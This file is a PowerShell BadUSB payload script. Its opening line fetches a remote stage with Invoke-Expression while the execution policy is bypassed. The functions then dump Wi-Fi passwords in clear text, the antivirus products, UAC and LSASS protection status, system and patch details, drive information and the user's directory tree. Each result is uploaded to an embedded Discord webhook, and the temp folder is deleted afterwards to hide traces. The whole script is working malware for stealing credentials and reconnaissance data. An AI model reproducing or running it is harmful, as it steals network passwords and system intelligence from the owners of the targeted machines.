#powershell -ExecutionPolicy Bypass -Command "$DiscordUrl = 'https://discord.com/api/webhooks/1199773516900352161/k8dAsA1xT4os6JLC8WstxzDyrhnmw2R2UrdT3AxcYWbifQppCDgAO9q3zcLY0756svJy'; Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/W1ns1d3r/W1ns1d3r_t3st/stage1_t3st.ps1'))"

# Function to handle the temporary directory
function TempDir {
    # Check if the C:\temp directory exists
    if (-not (Test-Path -Path "C:\temp" -PathType Container)) {
        # The folder does not exist, create it
        New-Item -Path "C:\" -Name "temp" -ItemType Directory
    }

    # Change the directory to C:\temp
    Set-Location -Path "C:\temp"
}

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $DiscordUrl
    }
}

# Créer un scriptblock pour la fonction Exfiltration
function Exfiltration {
    # Get desktop path
    $desktop = [Environment]::GetFolderPath("Desktop")

    # Call version-av function
    version-av

    # Call Wifi function
    Wifi

    # Call SysInfo function
    SysInfo

    #Call StorageInfo
    StorageInfo

    #Call TreeInfo
    TreeInfo
    
}

function version-av {
    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\AntiSpyware.txt -Encoding utf8

    # Upload AntiSpyware.txt to Discord
    Upload-Discord -file "C:\Temp\AntiSpyware.txt" -text "Anti-spyware version:"

}

function Wifi {
    # Crée le dossier temporaire wifi dans C:\temp
    New-Item -Path "C:\temp" -Name "wifi" -ItemType "directory" -Force
    Set-Location -Path "C:\temp\wifi"

    # Exporte les profils Wi-Fi
    netsh wlan export profile key=clear

    # Modifie les chemins dans le fichier et sauvegarde le résultat dans wifi.txt
    Select-String -Path *.xml -Pattern 'keyMaterial' | ForEach-Object {
        $_ -replace '</?keyMaterial>', '' -replace "C:\\Users\\$env:UserName\\Desktop\\", '' -replace '.xml:22:', ''
    } | Out-File -FilePath "wifi.txt" -Encoding utf8

    # Charge le fichier wifi.txt sur Discord
    Upload-Discord -file "wifi.txt" -text "Wifi password :"

    # Retourne au dossier temporaire C:\temp
    Set-Location -Path "C:\temp"

    # Supprime le dossier temporaire wifi
    Remove-Item -Path "C:\temp\wifi" -Force -Recurse
}

function SysInfo {
    # Get desktop path
    $desktop = ([Environment]::GetFolderPath("Desktop"))

    # Get registry values
    $ConsentPromptBehaviorAdmin_Value = Get-RegistryValue $Key $ConsentPromptBehaviorAdmin_Name 
    $PromptOnSecureDesktop_Value = Get-RegistryValue $Key $PromptOnSecureDesktop_Name

    # Evaluate UAC settings
    If($ConsentPromptBehaviorAdmin_Value -Eq 0 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Never notify" }
    ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Notify me only when apps try to make changes to my computer (do not dim my desktop)" } 
    ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Notify me only when apps try to make changes to my computer (default)" }
    ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 2 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Always notify" }
    Else{ $UAC = "Unknown" } 

    # Check if LSASS is running as a protected process
    $lsass = Get-Process -Name "lsass"
    if ($lsass.ProtectedProcess) {$lsassStatus = "LSASS is running as a protected process."} 
    else {$lsassStatus = "LSASS is not running as a protected process."}

    # Get names of items in the Startup folder
    $StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name

    # Get System Information
    $computerSystem = Get-CimInstance CIM_ComputerSystem
    $computerName = $computerSystem.Name
    $computerModel = $computerSystem.Model
    $computerManufacturer = $computerSystem.Manufacturer
    $computerBIOS = Get-CimInstance CIM_BIOSElement  | Out-String
    $computerOs=(Get-WMIObject win32_operatingsystem) | Select Caption, Version  | Out-String
    $computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List  | Out-String
    $computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List  | Out-String
    $computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}  | Out-String
    $computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table  | Out-String

    # Get additional information
    $AdditionalInfo = @"
    UAC Setting: $UAC
    LSASS Status: $lsassStatus
    Startup Items: $StartUp
    System Information:
        Computer Name: $computerName
        Model: $computerModel
        Manufacturer: $computerManufacturer
        BIOS: $computerBIOS
        OS: $computerOs
        CPU: $computerCpu
        Mainboard: $computerMainboard
        RAM Capacity: $computerRamCapacity
        RAM: $computerRam
"@



    # Generate a report of updates installed on the computer
    $userDir = "C:\Temp"
    $fileSaveDir = New-Item -Path $userDir -ItemType Directory -Force
    $date = Get-Date
    $Report = "`r`n`r`nUpdate Report`r`n`r`nGenerated on: $Date`r`n`r`nInstalled Updates:`r`n"

    $UpdatesInfo = Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | Sort-Object -Property InstalledOn -Descending
    foreach ($Update in $UpdatesInfo) {
        $Report += "Description: $($Update.Description)`r`nHotFixId: $($Update.HotFixId)`r`nInstalledOn: $($Update.InstalledOn)`r`nInstalledBy: $($Update.InstalledBy)`r`n`r`n"
    }

    # Append additional information to the report
    $Report += $AdditionalInfo

    $Report | Out-File -FilePath "C:\Temp\System_Informations.txt" -Append -Encoding utf8

    # Upload files to Discord via the Upload-Discord function
    Upload-Discord -file "C:\temp\System_Informations.txt" -text "System Informations :"
}

# Function to get storage information
function StorageInfo {
    # Create or clear the Storage_Info.txt file
    $storageFilePath = "C:\Temp\Storage_Info.txt"
    Set-Content -Path $storageFilePath -Value $null

    Get-WmiObject Win32_LogicalDisk | ForEach-Object {
        $driveLetter = $_.DeviceID
        $driveLabel = $_.VolumeName
        $driveType = $_.DriveType
        $driveSize = [math]::Round(($_.Size / 1GB), 2)
        $freeSpace = [math]::Round(($_.FreeSpace / 1GB), 2)
        $usedSpace = $driveSize - $freeSpace

        $info = @"
        Drive Letter: $driveLetter
        Volume Label: $driveLabel
        Drive Type: $driveType
        Total Size: ${driveSize}GB
        Used Space: ${usedSpace}GB
        Free Space: ${freeSpace}GB
"@
        # Append information to the Storage_Info.txt file
        Add-Content -Path $storageFilePath -Value $info
    }

    # Upload Storage_Info.txt to Discord
    Upload-Discord -file $storageFilePath -text "Storage Information :"
}

# Function to get directory tree information
function TreeInfo {
    # Create or clear the Tree.txt file
    $treeFilePath = "C:\Temp\Tree.txt"
    Set-Content -Path $treeFilePath -Value $null

    # Run the 'tree' command and redirect the output to Tree.txt
    tree $Env:userprofile /a /f | Out-File -FilePath $treeFilePath -Encoding utf8

    # Upload Tree.txt to Discord
    Upload-Discord -file $treeFilePath -text "Directory Tree Information :"
}

# Function to delete the temporary directory
function DelTempDir {
    Set-Location -Path "C:\"
    
    # Check if the C:\temp directory exists before attempting to remove it
    if (Test-Path -Path "C:\temp" -PathType Container) {
        Remove-Item -Path "C:\temp" -Force -Recurse
        
    }

}

# Call TempDir
TempDir

# Call Exfiltration
Exfiltration

# Call DelTempDir
DelTempDir
